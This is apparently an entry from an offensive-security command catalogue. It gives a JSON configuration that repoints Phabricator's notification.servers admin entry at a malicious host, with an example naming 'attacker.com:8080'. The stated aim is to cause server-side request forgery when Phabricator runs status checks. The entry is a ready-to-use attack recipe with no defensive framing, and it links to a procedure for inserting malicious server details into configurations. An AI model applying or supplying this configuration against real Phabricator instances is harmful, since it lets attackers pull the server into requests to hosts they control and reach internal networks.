---
data: |-
  [
    {
      "type": "client",
      "host": "phabricator.mycompany.com",
      "port": 22280,
      "protocol": "https"
    },
    {
      "type": "admin",
      "host": "X.X.X.X",
      "port": 22281,
      "protocol": "http"
    }
  ]
tags:
  - configuration
  - ssrf
type: command
output: null
executor: json
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:46.185Z'
id: 58928e84-174c-43f0-87d8-1dd53f917ba0
verified: false
validated: true
submitted: true
---
# configure-phabricator-notification-servers-json

## Command

```json
[
  {
    "type": "client",
    "host": "phabricator.mycompany.com",
    "port": 22280,
    "protocol": "https"
  },
  {
    "type": "admin",
    "host": "X.X.X.X",
    "port": 22281,
    "protocol": "http"
  }
]
```

## Description

This JSON configuration modifies Phabricator's notification.servers to point the admin server to a malicious endpoint, enabling SSRF when Phabricator connects for status checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| host | Server hostname or IP (e.g., X.X.X.X for malicious server) | Yes |
| port | Server port (e.g., 22281) | Yes |
| type | Server role (admin or client) | Yes |
| protocol | Connection protocol (http or https) | Yes |

## Examples

### Basic Usage

```json
{
  "type": "admin",
  "host": "attacker.com",
  "port": 8080,
  "protocol": "http"
}
```

### Advanced Usage

Include full array with client block preserved, as shown in the command.

## Expected Output

Phabricator connects to the specified admin server and sends a GET request to /status, which can be intercepted and redirected.

## Related

- [[procedures/Modify-Configuration-with-Malicious-Server-Details]]
